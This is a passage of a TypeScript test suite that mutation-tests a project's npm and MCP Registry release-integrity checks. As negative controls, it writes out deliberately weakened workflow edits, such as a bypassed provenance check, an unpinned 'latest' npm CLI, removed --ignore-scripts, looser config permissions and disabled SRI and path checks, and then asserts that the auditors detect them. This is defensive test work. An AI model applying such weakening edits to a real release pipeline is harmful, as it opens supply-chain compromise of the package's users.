  // later assertion, or satisfy the rule with assertion-shaped inert text.
  if (sourceHasNegativeControl(filename, content)) return null;

  // Path (b): explicit reviewed exemption reason. Format:
  //   // META-INVARIANT-EXEMPT: <reason>
  // Must be a standalone single-line comment with a non-empty reason in the
  // first 50 lines. Strings, block comments, and empty markers do not count.
  if (hasHeaderExemption(filename, content)) return null;

  return (
    `${filename} has no INLINE NEGATIVE control test and no META-INVARIANT-EXEMPT marker. ` +
    `Add either: (a) a negative-control test whose it()/test()/describe() TITLE contains "NEGATIVE" ` +
    `(a test that drives the invariant logic with intentionally-drifted input and asserts the ` +
    `violation IS detected), OR (b) a "// META-INVARIANT-EXEMPT: <reason>" comment in the first ` +
    `50 lines stating the reviewed reason (a bare comment mentioning ` +
    `"negative" no longer counts — see the rc.21 audit).`
  );
}

describe("META-invariant: exact structural census + NEGATIVE control coverage", () => {
  // PR #443 raised hybrid candidate-audit invocations from 24 to 53; the m109-m110
  // migration adds 12 bounded candidates for 65 total, and m111, paired m112-m113, m114-m164,
  // plus the nested m108->m107, m140->m139, and m145->m144 dependency pairs reuse those exact
  // candidate slots without adding another full matrix scan. The current v3 workload is
  // CPU-bound and the exact Node 22 floor proved the old 480s ceiling insufficient under
  // full-suite contention (481.474s after a 327.383s run of the same source). Keep a finite
  // 720s local breaker inside the 20-minute full-suite jobs without dropping work.
  beforeAll(async () => {
    const [matrixSource, fixtureBefore, transitionAuthority] = await Promise.all([
      fs.readFile(releaseIntegritySourcePath, "utf8"),
      fs.readFile(releaseMutationIdentityFixturePath, "utf8"),
      fs.readFile(releaseMutationTransitionFixturePath, "utf8")
    ]);
    expect(sha256Text(fixtureBefore)).toBe(RELEASE_MUTATION_IDENTITY_FIXTURE_SHA256);
    expect(sha256Text(transitionAuthority)).toBe(RELEASE_MUTATION_TRANSITION_FIXTURE_SHA256);

    // The immutable fixture remains historical authority after the current source deliberately
    // adopts a mixed legacy/declarative representation; it is never regenerated or rewritten here.
    expect(await fs.readFile(releaseMutationIdentityFixturePath, "utf8")).toBe(fixtureBefore);
    const outsideSliceCommentDrift = replaceExactly(
      matrixSource,
      "// @ts-expect-error — .mjs consumer helpers have no declaration file; the release invariant exercises cleanup behavior.",
      "// @ts-expect-error — .mjs consumer helpers have no declaration file; the release invariant exercises cleanup contract."
    );
    // The current positive control must cross the versioned v2->v3 authority. The legacy auditor
    // below remains intentionally historical and is used only to retain its detailed mutation
    // negative controls; it is no longer allowed to define whether the current baseline is clean.
    expect(releaseMutationVersionedTransitionAuditProblems(matrixSource, fixtureBefore, transitionAuthority)).toEqual(
      []
    );
    expect(
      releaseMutationVersionedTransitionAuditProblems(outsideSliceCommentDrift, fixtureBefore, transitionAuthority)
    ).toEqual(expect.arrayContaining([expect.stringMatching(/current matrix source witness mismatch/)]));
    const preparedAudit = createReleaseMutationIdentityAuditor(fixtureBefore);
    const historicalBaselineProblems = preparedAudit.auditMatrix(matrixSource);
    const historicalMutationProblems = (candidate: string): string[] =>
      diagnosticMultisetDifference(preparedAudit.auditMatrix(candidate), historicalBaselineProblems);
    const historicalFixtureMutationProblems = (candidateFixture: string): string[] =>
      diagnosticMultisetDifference(
        releaseMutationIdentityAuditProblems(matrixSource, candidateFixture),
        historicalBaselineProblems
      );
    const crossGenerationMutationProblems = (candidate: string): string[] => [
      ...historicalMutationProblems(candidate),
      ...releaseMutationVersionedTransitionAuditProblems(candidate, fixtureBefore, transitionAuthority)
    ];
    const versionedProblemsWithCoarseWitnessesRepinned = (candidate: string): string[] => {
      const observation = observeReleaseMutationTransitionMatrix(candidate);
      if (observation.matrixSliceSha256 === null) throw new Error("causal control lost the current matrix slice");
      const repinnedAuthority = JSON.parse(transitionAuthority) as {
        current: { matrixSliceSha256: string; matrixSourceSha256: string };
      };
      repinnedAuthority.current.matrixSourceSha256 = observation.sourceSha256;
      repinnedAuthority.current.matrixSliceSha256 = observation.matrixSliceSha256;
      return releaseMutationVersionedTransitionAuditProblems(
        candidate,
        fixtureBefore,
        JSON.stringify(repinnedAuthority)
      );
    };
    expect(crossGenerationMutationProblems(matrixSource)).toEqual([]);
    // Subtract the historical auditor's known current-transition debt as a multiset. Its detailed
    // mutation diagnostics remain useful, but pre-existing v2-vs-v3 findings cannot satisfy a
    // candidate's negative control or mask a missing candidate-specific diagnostic.
    const firstRepeatedProblems = historicalMutationProblems(outsideSliceCommentDrift);
    const stableRepeatedProblems = [...firstRepeatedProblems];
    expect(firstRepeatedProblems).toEqual([
      expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/)
    ]);

    // NEGATIVE control: a singleton primary matcher must remain an unconditional direct
    // callback statement. Wrapping the exact matcher in a branch preserves its bytes but
    // destroys the causal guarantee that the mutation is actually asserted.
    const singletonCaseFoldedMatcher = [
      "    expect(githubWorkflowSchemaProblems(caseFoldedEnvMutation)).toContainEqual(",
      "      expect.stringMatching(/case-insensitive duplicate NPM_CONFIG_REGISTRY\\/npm_config_registry/)",
      "    );"
    ].join("\n");
    const conditionalSingletonMatcher = replaceExactly(
      matrixSource,
      singletonCaseFoldedMatcher,
      `    if (false) {\n${singletonCaseFoldedMatcher}\n    }`
    );
    const conditionalSingletonProblems = versionedProblemsWithCoarseWitnessesRepinned(conditionalSingletonMatcher);
    expect(conditionalSingletonProblems).not.toEqual(
      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
    );
    expect(conditionalSingletonProblems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid singleton primary matcher .*release\.case\.m001.*unconditional direct execution/
        )
      ])
    );

    // NEGATIVE controls: the narrow template support accepts only passive identifier
    // interpolations. A call or property access must not become executable while the
    // identity scanner resolves the exact m138 needle/replacement/anchor bytes.
    const nonPassiveM138CallInterpolation = replaceExactly(
      matrixSource,
      ["      replacement: `              $", "{NPM_PROVENANCE_AUDIT_COMMAND}`,"].join(""),
      ["      replacement: `              $", "{NPM_PROVENANCE_AUDIT_COMMAND.trim()}`,"].join("")
    );
    const nonPassiveM138PropertyInterpolation = replaceExactly(
      matrixSource,
      ["      replacement: `              $", "{NPM_PROVENANCE_AUDIT_COMMAND}`,"].join(""),
      ["      replacement: `              $", "{NPM_PROVENANCE_IDENTITY.auditCommand}`,"].join("")
    );
    for (const nonPassiveM138Interpolation of [nonPassiveM138CallInterpolation, nonPassiveM138PropertyInterpolation]) {
      expect(historicalMutationProblems(nonPassiveM138Interpolation)).toEqual(
        expect.arrayContaining([
          expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
          expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
          expect.stringMatching(
            /release mutation hybrid descriptor release\.m138 must contain exact literal passive values/
          )
        ])
      );
    }

    const mcpbSpreadOverride = replaceExactly(
      matrixSource,
      [
        '      integrity: readFileSync(new URL("../scripts/check-release-integrity.mjs", import.meta.url), "utf8"),',
        '      npmArtifact: readFileSync(new URL("../scripts/npm-package-artifact.mjs", import.meta.url), "utf8"),',
        '      packageLock: readFileSync(new URL("../package-lock.json", import.meta.url), "utf8"),'
      ].join("\n"),
      [
        '      integrity: readFileSync(new URL("../scripts/check-release-integrity.mjs", import.meta.url), "utf8"),',
        '      ...[{ integrity: "alternate release integrity source" }][0],',
        '      npmArtifact: readFileSync(new URL("../scripts/npm-package-artifact.mjs", import.meta.url), "utf8"),',
        '      packageLock: readFileSync(new URL("../package-lock.json", import.meta.url), "utf8"),'
      ].join("\n")
    );
    expect(historicalMutationProblems(mcpbSpreadOverride)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid mcpbInputs must be one exact frozen source object with 14 direct reviewed properties/
        )
      ])
    );

    const missingDeclarativeRootIdentity = replaceExactly(
      matrixSource,
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m002", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n"),
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m999", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n")
    );
    const missingDeclarativeIdentity = replaceExactly(
      missingDeclarativeRootIdentity,
      ['      id: "release.case.m107",', "      root: releaseMutationM107,"].join("\n"),
      ['      id: "release.case.m108",', "      root: releaseMutationM108,"].join("\n")
    );
    expect(historicalMutationProblems(missingDeclarativeIdentity)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m002 must exist in exactly one legacy XOR declarative representation; found 0\/0/
        ),
        expect.stringMatching(/release mutation hybrid descriptor release\.m999 has no frozen identity/),
        expect.stringMatching(/release mutation hybrid case allowlist must be exact/),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m108 disagrees with its exact frozen identity/
        )
      ])
    );

    const overlappingLegacyIdentity = replaceExactly(
      matrixSource,
      [
        "    const releaseIntegrityText = mcpbInputs.integrity;",
        "    const releaseMutationPlan = new ReleaseMutationPlan({"
      ].join("\n"),
      [
        "    void replaceExactly(",
        "        mcpbInputs.integrity,",
        "        'import { isDeepStrictEqual } from \"node:util\";',",
        '        "const isDeepStrictEqual = () => true;"',
        "      );",
        "    const releaseIntegrityText = mcpbInputs.integrity;",
        "    const releaseMutationPlan = new ReleaseMutationPlan({"
      ].join("\n")
    );
    expect(historicalMutationProblems(overlappingLegacyIdentity)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m002 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        )
      ])
    );

    const sameHashRemainingFixture = replaceExactly(
      fixtureBefore,
      "6339e5c510913eafb1defe67939b667f2d19461df01fe4e791b3ee7afb2a8909",
      "2523c1c577061ab48258e780f02ccda0cba9ca0ac209d9cf3362a2e7680fc9b1"
    );
    const sameHashRemainingProblems = historicalFixtureMutationProblems(sameHashRemainingFixture);
    expect(sameHashRemainingProblems).toContainEqual(
      expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/)
    );
    expect(
      sameHashRemainingProblems.filter((problem) =>
        problem.includes("release mutation hybrid frozen ID release.m002 must exist in exactly one legacy XOR")
      )
    ).toEqual([]);

    const registrySourceLine =
      '    const registryPublishStepSource = releaseMutationPlan.registerSource("workflow.registry-publish-step", registryRun);';
    const releaseWorkflowSourceBlock = [
      "    const releaseWorkflowFixtureSource = releaseMutationPlan.registerSource(",
      '      "fixture.release-workflow",',
      "      mcpbInputs.release",
      "    );"
    ].join("\n");
    const npmProvenanceAuditCommandSourceBlock = [
      "    const npmProvenanceAuditCommandSource = releaseMutationPlan.registerSource(",
      '      "fragment.npm-provenance-audit-command",',
      "      NPM_PROVENANCE_AUDIT_COMMAND",
      "    );"
    ].join("\n");
    const npmProvenanceEvaluatorCommandSourceBlock = [
      "    const npmProvenanceEvaluatorCommandSource = releaseMutationPlan.registerSource(",
      '      "fragment.npm-provenance-evaluator-command",',
      "      NPM_PROVENANCE_EVALUATOR_COMMAND",
      "    );"
    ].join("\n");
    for (const [
      label,
      registryReplacement,
      releaseWorkflowReplacement,
      npmAuditCommandReplacement,
      npmEvaluatorCommandReplacement
    ] of [
      [
        "id",
        '    const registryPublishStepSource = releaseMutationPlan.registerSource("workflow.registry-step", registryRun);',
        [
          "    const releaseWorkflowFixtureSource = releaseMutationPlan.registerSource(",
          '      "fixture.release-source",',
          "      mcpbInputs.release",
          "    );"
        ].join("\n"),
        [
          "    const npmProvenanceAuditCommandSource = releaseMutationPlan.registerSource(",
          '      "fragment.npm-provenance-command",',
          "      NPM_PROVENANCE_AUDIT_COMMAND",
          "    );"
        ].join("\n"),
        [
          "    const npmProvenanceEvaluatorCommandSource = releaseMutationPlan.registerSource(",
          '      "fragment.npm-provenance-evaluator",',
          "      NPM_PROVENANCE_EVALUATOR_COMMAND",
          "    );"
        ].join("\n")
      ],
      [
        "value",
        '    const registryPublishStepSource = releaseMutationPlan.registerSource("workflow.registry-publish-step", releaseIntegrityText);',
        [
          "    const releaseWorkflowFixtureSource = releaseMutationPlan.registerSource(",
          '      "fixture.release-workflow",',
          "      releaseIntegrityText",
          "    );"
        ].join("\n"),
        [
          "    const npmProvenanceAuditCommandSource = releaseMutationPlan.registerSource(",
          '      "fragment.npm-provenance-audit-command",',
          "      releaseIntegrityText",
          "    );"
        ].join("\n"),
        [
          "    const npmProvenanceEvaluatorCommandSource = releaseMutationPlan.registerSource(",
          '      "fragment.npm-provenance-evaluator-command",',
          "      releaseIntegrityText",
          "    );"
        ].join("\n")
      ],
      [
        "handle",
        '    const registryStepSource = releaseMutationPlan.registerSource("workflow.registry-publish-step", registryRun);',
        [
          "    const releaseWorkflowSource = releaseMutationPlan.registerSource(",
          '      "fixture.release-workflow",',
          "      mcpbInputs.release",
          "    );"
        ].join("\n"),
        [
          "    const npmAuditCommandSource = releaseMutationPlan.registerSource(",
          '      "fragment.npm-provenance-audit-command",',
          "      NPM_PROVENANCE_AUDIT_COMMAND",
          "    );"
        ].join("\n"),
        [
          "    const npmEvaluatorCommandSource = releaseMutationPlan.registerSource(",
          '      "fragment.npm-provenance-evaluator-command",',
          "      NPM_PROVENANCE_EVALUATOR_COMMAND",
          "    );"
        ].join("\n")
      ]
    ] as const) {
      const registrySourceDrift = replaceExactly(matrixSource, registrySourceLine, registryReplacement);
      const releaseWorkflowSourceDrift = replaceExactly(
        registrySourceDrift,
        releaseWorkflowSourceBlock,
        releaseWorkflowReplacement
      );
      const npmAuditCommandSourceDrift = replaceExactly(
        releaseWorkflowSourceDrift,
        npmProvenanceAuditCommandSourceBlock,
        npmAuditCommandReplacement
      );
      const sourceDrift = replaceExactly(
        npmAuditCommandSourceDrift,
        npmProvenanceEvaluatorCommandSourceBlock,
        npmEvaluatorCommandReplacement
      );
      const sourceBindingProblems = preparedAudit
        .auditMatrix(sourceDrift)
        .filter((problem) => problem.startsWith("release mutation hybrid sources must bind "));
      expect(sourceBindingProblems, `derived source ${label} drift`).toHaveLength(4);
    }

    // NEGATIVE control: the derived Registry source is admitted only after its exact
    // clean raw-run baseline, with no intervening or reordered statement.
    const registryBaselineAndSource = [
      "    expect(mcpRegistryRunProblems(registryRun, mcpbInputs.integrity)).toEqual([]);",
      registrySourceLine
    ].join("\n");
    const reorderedRegistryBaseline = replaceExactly(
      matrixSource,
      registryBaselineAndSource,
      [registrySourceLine, "    expect(mcpRegistryRunProblems(registryRun, mcpbInputs.integrity)).toEqual([]);"].join(
        "\n"
      )
    );
    expect(historicalMutationProblems(reorderedRegistryBaseline)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/Registry-step source must immediately follow one exact clean registry run assertion/)
      ])
    );
    const duplicatedRegistryBaseline = replaceExactly(
      matrixSource,
      registryBaselineAndSource,
      [
        "    expect(mcpRegistryRunProblems(registryRun, mcpbInputs.integrity)).toEqual([]);",
        registryBaselineAndSource
      ].join("\n")
    );
    expect(historicalMutationProblems(duplicatedRegistryBaseline)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid registry run requires one exact clean baseline assertion; found 2/
        )
      ])
    );

    const m109Witness = [
      '        anchor: "MCP_REGISTRY_CONFIRMED=false\\nMCP_REGISTRY_CONFIRMED=true",',
      "        before: 0,",
      "        after: 1"
    ].join("\n");
    const positiveOnlyM109Witness = replaceExactly(
      matrixSource,
      m109Witness,
      [
        '        anchor: "MCP_REGISTRY_CONFIRMED=false\\nMCP_REGISTRY_CONFIRMED=true",',
        "        before: 1,",
        "        after: 0"
      ].join("\n")
    );
    expect(historicalMutationProblems(positiveOnlyM109Witness)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m109 disagrees with its exact frozen semantics/
        )
      ])
    );
    const needleDerivedM109Witness = replaceExactly(
      matrixSource,
      m109Witness,
      ['        anchor: "MCP_REGISTRY_CONFIRMED=false",', "        before: 0,", "        after: 1"].join("\n")
    );
    expect(historicalMutationProblems(needleDerivedM109Witness)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m109 disagrees with its exact frozen semantics/
        )
      ])
    );
    const weakenedM110Replacement = replaceExactly(
      matrixSource,
      '      replacement: \'[ "$MCP_PUBLISH_ATTEMPTED" != "true" ] && [ "$MCP_REGISTRY_CONFIRMED" != "true" ]\',',
      '      replacement: \'[ "$MCP_PUBLISH_ATTEMPTED" != "true" ] || [ "$MCP_REGISTRY_CONFIRMED" != "true" ]\','
    );
    expect(historicalMutationProblems(weakenedM110Replacement)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m110 must contain exact literal passive values/
        )
      ])
    );

    const m109ExpectationBlock = [
      '            id: "release.expectation.m109.primary",',
      '            kind: "problem",',
      "            problem:",
      '              "stable MCP Registry publication must bind exact source manifests, one pinned publisher write, and bounded readback"'
    ].join("\n");
    const borrowedM109Problem = replaceExactly(
      matrixSource,
      m109ExpectationBlock,
      [
        '            id: "release.expectation.m109.primary",',
        '            kind: "problem",',
        "            problem:",
        '              "MCP Registry reconciliation must retain exact identity, lifecycle, absence, and convergence semantics"'
      ].join("\n")
    );
    expect(historicalMutationProblems(borrowedM109Problem)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m109 disagrees with its exact frozen identity/
        )
      ])
    );

    // NEGATIVE control: append the fifty-five exact historical root call-node byte spans after
    // the frozen legacy tail. The m107, m139, and m144 roots retain their nested m108, m140,
    // and m145 dependencies, so one resurrection of a root must fail both frozen XOR identities.
    // Earlier insertion would shift
    // unrelated positional identities, while different inner indentation would not
    // reproduce the pinned legacy span hashes and therefore would not exercise the detector.
    const finalRequiredReleaseCheck = '    expect(REQUIRED_RELEASE_CHECKS).not.toContain("test-windows");';
    const legacyM108CallNode = [
      "replaceExactly(",
      "            registryRun,",
      "            'require_job_reserve 2200 \"MCP Registry publish and convergence\"',",
      "            'for replay in {1..2}; do\\n  require_job_reserve 2200 \"MCP Registry publish and convergence\"'",
      "          )"
    ].join("\n");
    const legacyM107CallNode = [
      "replaceExactly(",
      "          replaceExactly(",
      "            registryRun,",
      "            'require_job_reserve 2200 \"MCP Registry publish and convergence\"',",
      "            'for replay in {1..2}; do\\n  require_job_reserve 2200 \"MCP Registry publish and convergence\"'",
      "          ),",
      "          'echo \"MCP Registry exact publication is confirmed for $MCP_NAME@$VERSION\"',",
      "          'echo \"MCP Registry exact publication is confirmed for $MCP_NAME@$VERSION\"\\ndone'",
      "        )"
    ].join("\n");
    const legacyM109CallNode = [
      "replaceExactly(",
      "          registryRun,",
      '          "MCP_REGISTRY_CONFIRMED=false",',
      '          "MCP_REGISTRY_CONFIRMED=false\\nMCP_REGISTRY_CONFIRMED=true"',
      "        )"
    ].join("\n");
    const legacyM110CallNode = [
      "replaceExactly(",
      "          registryRun,",
      '          \'[ "$MCP_PUBLISH_ATTEMPTED" != "true" ] || [ "$MCP_REGISTRY_CONFIRMED" != "true" ]\',',
      '          \'[ "$MCP_PUBLISH_ATTEMPTED" != "true" ] && [ "$MCP_REGISTRY_CONFIRMED" != "true" ]\'',
      "        )"
    ].join("\n");
    const legacyM111CallNode = [
      "replaceExactly(",
      "          mcpbInputs.integrity,",
      "          'phase === \"convergence\" && (status === 429 || status >= 500)',",
      "          'phase === \"convergence\"'",
      "        )"
    ].join("\n");
    const legacyM112CallNode = [
      "replaceExactly(",
      "      mcpbInputs.release,",
      "      NPM_PROVENANCE_CONTEXT_COMMAND,",
      '      "true # provenance context bypassed"',
      "    )"
    ].join("\n");
    const legacyM113CallNode = [
      "replaceExactly(",
      "      mcpbInputs.integrity,",
      "      'eventName: \"push\"',",
      "      'eventName: \"workflow_dispatch\"'",
      "    )"
    ].join("\n");
    const legacyM114CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        'require_job_reserve 4500 \"npm publish\"',",
      "        'require_job_reserve 2100 \"npm publish\"'",
      "      )"
    ].join("\n");
    const legacyM115CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        'require_job_reserve 2700 \"token-free npm provenance verification\"',",
      "        'require_job_reserve 1200 \"token-free npm provenance verification\"'",
      "      )"
    ].join("\n");
    const legacyM116CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      `        \`PROVENANCE_SHA: \\\${{ github.sha }}\`,`,
      `        \`PROVENANCE_SHA: \\\${{ github.workflow_sha }}\``,
      "      )"
    ].join("\n");
    const legacyM117CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      `        \`      - name: \${NPM_PROVENANCE_STEP_NAME}\`,`,
      '        "      - name: Skipped npm provenance"',
      "      )"
    ].join("\n");
    const legacyM118CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      `        \`PUBLISH_ATTEMPTED: \\\${{ steps.npm_publication.outputs.publish_attempted }}\`,`,
      "        'PUBLISH_ATTEMPTED: \"false\"'",
      "      )"
    ].join("\n");
    const legacyM119CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      `        \`          RELEASE_JOB_DEADLINE_EPOCH: \\\${{ steps.deadline.outputs.epoch }}\\n\` +`,
      `          \`          EXPECTED_VERSION: \\\${{ steps.npm_publication.outputs.version }}\\n\` +`,
      `          \`          EXPECTED_SOURCE_SHA: \\\${{ steps.npm_publication.outputs.source_sha }}\\n\` +`,
      `          \`          EXPECTED_TAG: \\\${{ steps.npm_publication.outputs.tag }}\\n\` +`,
      `          \`          EXPECTED_INTEGRITY: \\\${{ steps.npm_publication.outputs.integrity }}\`,`,
      `        \`          RELEASE_JOB_DEADLINE_EPOCH: 9999999999\\n\` +`,
      `          \`          EXPECTED_VERSION: \\\${{ steps.npm_publication.outputs.version }}\\n\` +`,
      `          \`          EXPECTED_SOURCE_SHA: \\\${{ steps.npm_publication.outputs.source_sha }}\\n\` +`,
      `          \`          EXPECTED_TAG: \\\${{ steps.npm_publication.outputs.tag }}\\n\` +`,
      `          \`          EXPECTED_INTEGRITY: \\\${{ steps.npm_publication.outputs.integrity }}\``,
      "      )"
    ].join("\n");
    const legacyM120CallNode =
      // biome-ignore lint/suspicious/noTemplateCurlyInString: Historical source expression must remain exact.
      "replaceExactly(mcpbInputs.release, '          NPM_TOKEN: \"\"', `          NPM_TOKEN: \\${{ secrets.NPM_TOKEN }}`)";
    const legacyM121CallNode =
      "replaceExactly(mcpbInputs.release, '          NPM_CLI_VERSION: \"11.18.0\"', '          NPM_CLI_VERSION: \"latest\"')";
    const legacyM122CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        '          NPM_CLI_URL: \"https://registry.npmjs.org/npm/-/npm-11.18.0.tgz\"',",
      "        '          NPM_CLI_URL: \"https://registry.npmjs.org/npm/-/npm-latest.tgz\"'",
      "      )"
    ].join("\n");
    const legacyM123CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      `        \`          NPM_CLI_SRI: "\${NPM_PROVENANCE_CLI_SRI}"\`,`,
      "        '          NPM_CLI_SRI: \"sha512-unpinned\"'",
      "      )"
    ].join("\n");
    const legacyM124CallNode =
      "replaceExactly(mcpbInputs.release, '          NPM_CLI_SIZE: \"2997746\"', '          NPM_CLI_SIZE: \"0\"')";
    const legacyM125CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        '          NPM_GLOBALCONFIG=\"$VERIFY_ROOT/global.npmrc\"',",
      "        '          NPM_GLOBALCONFIG=\"$VERIFY_ROOT/user.npmrc\"'",
      "      )"
    ].join("\n");
    const legacyM126CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      '        \'/usr/bin/touch "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"\',',
      '        \'/bin/true "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"\'',
      "      )"
    ].join("\n");
    const legacyM127CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      '        \'/bin/chmod 600 "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"\',',
      '        \'/bin/chmod 644 "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"\'',
      "      )"
    ].join("\n");
    const legacyM128CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        '\"NPM_CONFIG_USERCONFIG=$NPM_USERCONFIG\"',",
      "        '\"NPM_CONFIG_USERCONFIG=/dev/null\"'",
      "      )"
    ].join("\n");
    const legacyM129CallNode =
      "replaceExactly(mcpbInputs.release, '\"NPM_CONFIG_PREFER_ONLINE=true\"', " +
      "'\"NPM_CONFIG_PREFER_ONLINE=false\"')";
    const legacyM130CallNode =
      'replaceExactly(mcpbInputs.release, "--max-filesize 4194304 --retry 0", "--max-filesize 4194304 --retry 1")';
    const legacyM131CallNode =
      'replaceExactly(mcpbInputs.release, \'[ "$NPM_CLI_ACTUAL_SRI" != "$NPM_CLI_SRI" ]\', "false")';
    const legacyM132CallNode = 'replaceExactly(mcpbInputs.release, "$0 !~ /^package\\\\//", "false")';
    const legacyM133CallNode = 'replaceExactly(mcpbInputs.release, "$0 ~ /(^|\\\\/)\\\\.\\\\.?(\\\\/|$)/", "false")';
    const legacyM134CallNode = 'replaceExactly(mcpbInputs.release, "seen[$0]++", "false")';
    const legacyM135CallNode =
      'replaceExactly(mcpbInputs.release, \'NF == 0 || (substr($0, 1, 1) != "-" && substr($0, 1, 1) != "d")\', "false")';
    const legacyM136CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      '        "--save-exact --package-lock=true --ignore-scripts --no-audit --no-fund --omit=optional",',
      '        "--save-exact --package-lock=true --no-audit --no-fund --omit=optional"',
      "      )"
    ].join("\n");
    const legacyM137CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        '.packages[\"node_modules/@oomkapwn/enquire-mcp\"].integrity == $integrity',",
      "        '.packages[\"node_modules/@oomkapwn/enquire-mcp\"].version == $version'",
      "      )"
    ].join("\n");
    const legacyM138CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      `        \`              /usr/bin/env -i "\\\${CLEAN_NPM_ENV[@]}" \\\\\\n                \${NPM_PROVENANCE_AUDIT_COMMAND}\`,`,
      `        \`              \${NPM_PROVENANCE_AUDIT_COMMAND}\``,
      "      )"
    ].join("\n");
    const legacyM140CallNode = 'replaceExactly(NPM_PROVENANCE_AUDIT_COMMAND, " --kill-after=10s", "")';
    const legacyM139CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        NPM_PROVENANCE_AUDIT_COMMAND,",
      '        replaceExactly(NPM_PROVENANCE_AUDIT_COMMAND, " --kill-after=10s", "")',
      "      )"
    ].join("\n");
    const legacyM141CallNode =
      'replaceExactly(mcpbInputs.release, "--json --include-attestations --omit=optional", "--json --omit=optional")';
    const legacyM142CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      '        "--fetch-retries=0 --fetch-timeout=60000 --prefer-online",',
      '        "--fetch-retries=0 --fetch-timeout=60000"',
      "      )"
    ].join("\n");
    const legacyM143CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      `        \`/usr/bin/env -i "\\\${CLEAN_ENV[@]}" \\\\\\n              \${NPM_PROVENANCE_EVALUATOR_COMMAND}\`,`,
      `        \`              \${NPM_PROVENANCE_EVALUATOR_COMMAND}\``,
      "      )"
    ].join("\n");
    const legacyM145CallNode = 'replaceExactly(NPM_PROVENANCE_EVALUATOR_COMMAND, " --kill-after=5s", "")';
    const legacyM144CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        NPM_PROVENANCE_EVALUATOR_COMMAND,",
      '        replaceExactly(NPM_PROVENANCE_EVALUATOR_COMMAND, " --kill-after=5s", "")',
      "      )"
    ].join("\n");
    const legacyM146CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      '        "for (( attempt=1; attempt<=8; attempt++ )); do",',
      '        "for (( attempt=1; attempt<=1; attempt++ )); do"',
      "      )"
    ].join("\n");
    const legacyM147CallNode =
      "replaceExactly(mcpbInputs.release, 'if [ \"$attempt\" -lt 8 ]; then', 'if [ \"$attempt\" -lt 7 ]; then')";
    const legacyM148CallNode = 'replaceExactly(mcpbInputs.release, "attempt $attempt/8", "attempt $attempt/7")';
    const legacyM149CallNode =
      'replaceExactly(mcpbInputs.release, "              /bin/sleep 10", "              /bin/sleep 1")';
    const legacyM150CallNode = [
      "replaceExactly(",
      "        mcpbInputs.release,",
      "        NPM_PROVENANCE_SUCCESS_CONDITION,",
      '        \'[ "$AUDIT_EXIT" -eq 0 ] || [ "$EVALUATOR_EXIT" -eq 0 ]\'',
      "      )"
    ].join("\n");
    const legacyM151CallNode = `replaceExactly(mcpbInputs.release, MCPB_EXACT_NPM_PUBLISH, \`\${MCPB_EXACT_NPM_PUBLISH}\\n\${MCPB_EXACT_NPM_PUBLISH}\`)`;
    const legacyM152CallNode =
      'replaceExactly(mcpbInputs.integrity, "workflowSha: expectedSourceSha", "workflowSha: declared.workflowSha")';
    const legacyM153CallNode =
      'replaceExactly(mcpbInputs.integrity, "statement.subject.length !== 1", "statement.subject.length < 1")';
    const legacyM154CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
      '        "subject.name !== expectedPurl || digest.sha512 !== expectedSha512",',
      '        "subject.name !== expectedPurl && digest.sha512 !== expectedSha512"',
      "      )"
    ].join("\n");
    const legacyM155CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
      '        "predicateType === NPM_PROVENANCE_IDENTITY.publishPredicateType",',
      '        "predicateType === NPM_PROVENANCE_IDENTITY.slsaPredicateType"',
      "      )"
    ].join("\n");
    const legacyM156CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
